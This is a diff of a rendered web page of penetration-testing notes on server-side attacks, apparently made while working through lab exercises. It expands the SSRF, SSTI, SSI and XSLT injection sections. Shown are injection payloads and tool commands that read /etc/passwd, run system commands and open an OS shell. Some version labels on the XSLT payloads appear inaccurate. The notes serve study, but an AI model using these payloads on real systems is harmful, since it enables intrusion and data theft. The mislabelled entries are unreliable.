@@ -658,13 +658,13 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#ssrf" class="md-nav__link">
+  <a href="#server-side-request-forgery-ssrf" class="md-nav__link">
     <span class="md-ellipsis">
-      SSRF
+      Server Side Request Forgery (SSRF)
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="SSRF">
+    <nav class="md-nav" aria-label="Server Side Request Forgery (SSRF)">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -751,13 +751,13 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#ssti" class="md-nav__link">
+  <a href="#server-side-template-injection-ssti" class="md-nav__link">
     <span class="md-ellipsis">
-      SSTI
+      Server Side Template Injection (SSTI)
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="SSTI">
+    <nav class="md-nav" aria-label="Server Side Template Injection (SSTI)">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -820,22 +820,22 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#ssi-injection-directives" class="md-nav__link">
+  <a href="#server-side-includes-ssi-injection-directives" class="md-nav__link">
     <span class="md-ellipsis">
-      SSI Injection - Directives
+      Server Side Includes (SSI) Injection - Directives
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#xslt-injection" class="md-nav__link">
+  <a href="#extensible-stylesheet-language-transformation-xslt-injection" class="md-nav__link">
     <span class="md-ellipsis">
-      XSLT Injection
+      eXtensible Stylesheet Language Transformation (XSLT) Injection
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="XSLT Injection">
+    <nav class="md-nav" aria-label="eXtensible Stylesheet Language Transformation (XSLT) Injection">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -1359,13 +1359,13 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#ssrf" class="md-nav__link">
+  <a href="#server-side-request-forgery-ssrf" class="md-nav__link">
     <span class="md-ellipsis">
-      SSRF
+      Server Side Request Forgery (SSRF)
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="SSRF">
+    <nav class="md-nav" aria-label="Server Side Request Forgery (SSRF)">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -1452,13 +1452,13 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#ssti" class="md-nav__link">
+  <a href="#server-side-template-injection-ssti" class="md-nav__link">
     <span class="md-ellipsis">
-      SSTI
+      Server Side Template Injection (SSTI)
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="SSTI">
+    <nav class="md-nav" aria-label="Server Side Template Injection (SSTI)">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -1521,22 +1521,22 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#ssi-injection-directives" class="md-nav__link">
+  <a href="#server-side-includes-ssi-injection-directives" class="md-nav__link">
     <span class="md-ellipsis">
-      SSI Injection - Directives
+      Server Side Includes (SSI) Injection - Directives
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#xslt-injection" class="md-nav__link">
+  <a href="#extensible-stylesheet-language-transformation-xslt-injection" class="md-nav__link">
     <span class="md-ellipsis">
-      XSLT Injection
+      eXtensible Stylesheet Language Transformation (XSLT) Injection
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="XSLT Injection">
+    <nav class="md-nav" aria-label="eXtensible Stylesheet Language Transformation (XSLT) Injection">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -1612,7 +1612,7 @@
 
 
 <h1 id="server-side-attacks">Server-Side Attacks</h1>
-<h2 id="ssrf">SSRF</h2>
+<h2 id="server-side-request-forgery-ssrf">Server Side Request Forgery (SSRF)</h2>
 <p><a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">OWASP SSRF Page</a></p>
 <h3 id="identification">Identification</h3>
 <p>Based on web app at http://10.129.201.127:34978 that has a drop down to check date availbility through a post parameter (<code>dateserver=http://dateserver.htb/availability.php&amp;date=2024-01-01</code>):</p>
@@ -1663,7 +1663,7 @@ ffuf -w ./ports.txt -u http://10.129.201.127/index.php -X POST -H &quot;Content-
 <li>Local port scan may work by comparing error messages, but error message may be the same for closed ports/other services that are open.</li>
 <li>LFI attempts may show different error messages for files that exist versus files that don't.</li>
 </ul>
-<h2 id="ssti">SSTI</h2>
+<h2 id="server-side-template-injection-ssti">Server Side Template Injection (SSTI)</h2>
 <h3 id="tepmlate-engines">Tepmlate engines</h3>
 <ul>
 <li><a href="https://jinja.palletsprojects.com/en/stable/">Jinga</a></li>
@@ -1743,7 +1743,12 @@ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './
 python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id # Execute system commands
 python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell # Obtain interactive shell
 </code></pre>
-<h2 id="ssi-injection-directives">SSI Injection - Directives</h2>
+<h2 id="server-side-includes-ssi-injection-directives">Server Side Includes (SSI) Injection - Directives</h2>
+<ul>
+<li>Typical SSI file extensions include .shtml, .shtm, and .stm (can be configured for arbitrary file extensions).</li>
+<li>SSI utilizes directives to add dynamically generated content to a static HTML page.</li>
+<li>Occurs when an attacker can inject SSI directives into a file (usually in the web root directory) that is subsequently served by the web server.</li>
+</ul>
 <table>
 <thead>
 <tr>
@@ -1753,15 +1758,19 @@ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell # Obtain 
 </thead>
 <tbody>
 <tr>
+<td><code>&lt;!--#name param1="value1" param2="value" --&gt;</code></td>
+<td>Directive format</td>
+</tr>
+<tr>
 <td><code>&lt;!--#printenv --&gt;</code></td>
-<td>Print variables</td>
+<td>Print the environment variables</td>
 </tr>
 <tr>
 <td><code>&lt;!--#config errmsg="Error!" --&gt;</code></td>
-<td>Change config</td>
+<td>Change config (the error message in this example)</td>
 </tr>
 <tr>
-<td><code>&lt;!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" --&gt;</code></td>
+<td><code>&lt;!--#echo var="DOCUMENT_NAME" var="DOCUMENT_URI" var="LAST_MODIFIED" var="DATE_LOCAL" --&gt;</code></td>
 <td>Print specific variable</td>
 </tr>
 <tr>
@@ -1770,11 +1779,31 @@ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell # Obtain 
 </tr>
 <tr>
 <td><code>&lt;!--#include virtual="index.html" --&gt;</code></td>
-<td>Include web file</td>
+<td>Include web file (only allows files in the web root directory)</td>
 </tr>
 </tbody>
 </table>
-<h2 id="xslt-injection">XSLT Injection</h2>
+<h2 id="extensible-stylesheet-language-transformation-xslt-injection">eXtensible Stylesheet Language Transformation (XSLT) Injection</h2>
+<ul>
+<li><a href="https://www.w3.org/TR/xslt-30/">Documentation</a></li>
+<li>XSLT can be used to define a data format which is subsequently enriched with data from the XML document.</li>
+<li>Similar structure to XML.</li>
+<li>It contains XSL elements within nodes prefixed with the xsl-prefix</li>
+<li>Example:</li>
+</ul>
+<pre><code class="language-xslt">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;
+    &lt;xsl:template match=&quot;/fruits&quot;&gt;
+        Here are all fruits of medium size ordered by their color:
+        &lt;xsl:for-each select=&quot;fruit&quot;&gt;
+            &lt;xsl:sort select=&quot;color&quot; order=&quot;descending&quot; /&gt;
+            &lt;xsl:if test=&quot;size = 'Medium'&quot;&gt;
+                &lt;xsl:value-of select=&quot;name&quot;/&gt; (&lt;xsl:value-of select=&quot;color&quot;/&gt;)
+            &lt;/xsl:if&gt;
+        &lt;/xsl:for-each&gt;
+    &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre>
 <h3 id="elements">Elements</h3>
 <table>
 <thead>
@@ -1807,6 +1836,9 @@ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell # Obtain 
 </tbody>
 </table>
 <h3 id="injection-payloads">Injection Payloads</h3>
+<ul>
+<li><code>&lt;</code> Test payload to see if an error message is returned.</li>
+</ul>
 <h4 id="information-disclosure">Information Disclosure</h4>
 <table>
 <thead>
@@ -1818,26 +1850,27 @@ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell # Obtain 
 <tbody>
 <tr>
 <td><code>&lt;xsl:value-of select="system-property('xsl:version')" /&gt;</code></td>
-<td></td>
+<td>Version</td>
 </tr>
 <tr>
 <td><code>&lt;xsl:value-of select="system-property('xsl:vendor')" /&gt;</code></td>
-<td></td>
+<td>Vendor</td>
 </tr>
 <tr>
 <td><code>&lt;xsl:value-of select="system-property('xsl:vendor-url')" /&gt;</code></td>
-<td></td>
+<td>Vendor URL</td>
 </tr>
 <tr>
 <td><code>&lt;xsl:value-of select="system-property('xsl:product-name')" /&gt;</code></td>
-<td></td>
+<td>Product name</td>
 </tr>
 <tr>
 <td><code>&lt;xsl:value-of select="system-property('xsl:product-version')" /&gt;</code></td>
-<td></td>
+<td>Product Version</td>
 </tr>
 </tbody>
 </table>
+<p><strong>Tip:</strong> Pass all the above payloads in one go separated by <code>&lt;br/&gt;</code> for formatting.</p>
 <h4 id="lfi_1">LFI</h4>
 <table>
 <thead>
@@ -1849,11 +1882,11 @@ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell # Obtain 
 <tbody>
 <tr>
 <td><code>&lt;xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" /&gt;</code></td>
-<td></td>
+<td>LFI for XSLT v1.0</td>
 </tr>
 <tr>
 <td><code>&lt;xsl:value-of select="php:function('file_get_contents','/etc/passwd')" /&gt;</code></td>
-<td></td>
+<td>LFI for XSLT v2.0</td>
 </tr>
 </tbody>
 </table>
@@ -1868,7 +1901,7 @@ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell # Obtain 
 <tbody>
 <tr>
 <td><code>&lt;xsl:value-of select="php:function('system','id')" /&gt;</code></td>
-<td></td>
+<td>RCE if the XSLT processor supports PHP functions</td>
 </tr>
 </tbody>
 </table>
